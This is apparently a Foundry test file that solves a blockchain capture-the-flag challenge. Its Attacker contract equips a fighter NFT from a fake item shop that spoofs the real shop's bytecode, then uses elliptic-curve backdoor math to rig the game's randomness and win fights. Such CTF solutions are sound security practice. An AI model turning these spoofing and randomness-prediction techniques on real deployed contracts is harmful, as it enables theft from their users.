// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "forge-ctf/CTFDeployment.sol";

import "src/Randomness.sol";
import "src/Factory.sol";
import "src/ItemShop.sol";
import "src/NFT.sol";
import "src/Challenge.sol";
import "src/OwnedUpgradeable.sol";
import "src/Interfaces.sol";
import "src/EllipticCurve.sol";

library RandomBytesGenerator {
    // Generate n random bytes
    function randbytes() public view returns (bytes32) {
        bytes32 randomBytes;
        for (uint256 i = 0; i < 32; i++) {
            // Shift left by 8 bits and add the new byte
            randomBytes |= bytes32(uint256(uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, i))) % 256)) << (i * 8));
        }
        return randomBytes;
    }
}

contract FakeItemShop is ItemShop {
    constructor(ItemShop shop) {
        _itemInfo[1] = ItemInfo({name: "Broadsword", slot: EquipmentSlot.Weapon, value: type(uint40).max, price: 0});
        _mint(address(this), 1, 100, "");
        _itemInfo[2] =
            ItemInfo({name: "Wooden Shield", slot: EquipmentSlot.Shield, value: type(uint40).max, price: 0});
        _mint(address(this), 2, 100, "");
        assembly{
            extcodecopy(shop, 0, 0, extcodesize(shop))
            return(0, extcodesize(shop))
        }
    }
}

contract Attacker{
    FakeItemShop public shop;
    NFT TOKEN; 

    uint128 targetId = 0;
    uint256 input = 0;

    uint256 public constant GX = 1;
    uint256 public constant GY = 2;
    uint256 public constant AA = 0;
    uint256 public constant BB = 3;
    uint256 public constant fieldOrder =
        uint256(21888242871839275222246405745257275088696311157297823662689037894645226208583);
    uint256 public constant groupOrder =
        uint256(21888242871839275222246405745257275088548364400416034343698204186575808495617);
    
    constructor(ItemShop _shop, NFT _TOKEN ) {
        shop = new FakeItemShop(_shop);
        TOKEN = _TOKEN; 
    }

    function ecMul(uint256 k, uint256 x, uint256 y) internal returns (uint256, uint256) {
        (bool s, bytes memory data) = address(7).call(abi.encode(x, y, k));
        require(s, "call failed");
        (uint256 x1, uint256 y1) = abi.decode(data, (uint256, uint256));
        return (x1, y1);
    }

    function onERC721Received(address, address, uint256 tokenId, bytes memory) public virtual returns (bytes4) {
        shop.buy{value:0}(1);
        shop.buy{value:0}(2);
        shop.setApprovalForAll(address(TOKEN), true);
        TOKEN.equip(tokenId, address(shop), 1);
        TOKEN.equip(tokenId, address(shop), 2);

        Trait memory trait = TOKEN.traits(tokenId);

        uint256 rand = uint256(trait.charisma) << 216 | uint256(trait.wisdom) << 176
            | uint256(trait.intelligence) << 136 | uint256(trait.constitution) << 96 | uint256(trait.dexterity) << 56
            | uint256(trait.strength) << 16 | uint256(trait.rarity);

        console2.log("rand: %x", rand);

        {
            uint256 n2x = rand;
            uint256 n2y = EllipticCurve.deriveY(2, n2x, AA, BB, fieldOrder);

            uint256 p = 0x123456789;
            uint256 q = 0xc8243991757dc8723e4976248127e573da4a2cbfad54b776d5a7c8d92b6e2a6b;
            uint256 invQ = EllipticCurve.invMod(q, groupOrder);

            (uint256 Qx, uint256 Qy) = ecMul(q, 1, 2);
            (uint256 n1xGx, uint256 n1xGy) = ecMul(invQ, n2x, n2y);
            (uint256 m1x, uint256 m1y) = ecMul(p, n1xGx, n1xGy);
            (uint256 m2,) = ecMul(m1x, Qx, Qy);

            input = m2;
        }
        TOKEN.fight(uint128(tokenId), targetId);
        return this.onERC721Received.selector;
    }

    // to receive items from item shop
    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC1155ReceiverUpgradeable.onERC1155Received.selector;
    }

    function getInput(FighterVars calldata attacker, FighterVars calldata attackee) external returns (uint256 inputs) {
        console2.log("attacker status:", attacker.attack);
        return ~input;
    }
}

contract Solve is BaseTest {
    NFT TOKEN; 
    ItemShop public itemShop;
    Factory factory;
    address oprator;
    function setUp() public override {
        super.setUp();
        
        vm.startBroadcast(system);

        factory = new Factory();
        
        oprator = getAdditionalAddress(0);
        // @audit - random seed
        factory.setRandomnessOperator(oprator);

        // implementation template
        itemShop = ItemShop(factory.createItemShop(address(factory.latestItemShopVersion()), abi.encode("")));

        TOKEN = NFT(factory.createCollection(abi.encode(string("Fighters"), string("FGHTRS"))));

        challenge = address(new Challenge(factory, itemShop, TOKEN));

        vm.stopBroadcast();

        vm.label(address(itemShop),'itemShop');
        vm.label(address(TOKEN), 'TOKEN');
        vm.label(address(factory), 'factory');
        vm.label(oprator, "oprator");
    }

    function test_Solve() public {
        console2.log("--------------------- before attack ------------------");
        console2.log('TOKEN.balanceOf(address(TOKEN))', TOKEN.balanceOf(address(TOKEN)));
        console2.log('TOKEN.balanceOf(address(Player))', TOKEN.balanceOf(address(player)));
         (,,,,,,,uint8 level) = TOKEN._traits(0);
        console2.log('TOKEN._traits.level', level);

        console2.log("---------------------  begin attack ------------------");
        // 铸造代币
        vm.startBroadcast(player);
        Attacker attacker = new Attacker(itemShop, TOKEN);
        address[] memory receivers = new address[](1);
        receivers[0] = address(attacker);
        TOKEN.batchMint(receivers);
        vm.stopBroadcast();

        console2.log("create attacker contract:", address(attacker));
        console2.log("fakeShop contract:", address(attacker.shop()));
        console2.log('TOKEN.balanceOf(address(Player))', TOKEN.balanceOf(address(player)));

        watcher(); // mint后触发fight

        // watcher();
        console2.log("---------------------  after attack ------------------");
        console2.log('TOKEN._traits.level', level);
        console2.log('TOKEN.balanceOf(address(TOKEN))', TOKEN.balanceOf(address(TOKEN)));
        

        assert(validation());
    }

    function watcher() internal {
        vm.startBroadcast(oprator);
        bytes32 randomness = RandomBytesGenerator.randbytes();
        TOKEN.resolveRandomness(randomness);
        vm.stopBroadcast();
    }

     function validation() internal view returns (bool) {
        return Challenge(challenge).isSolved();
    }
}
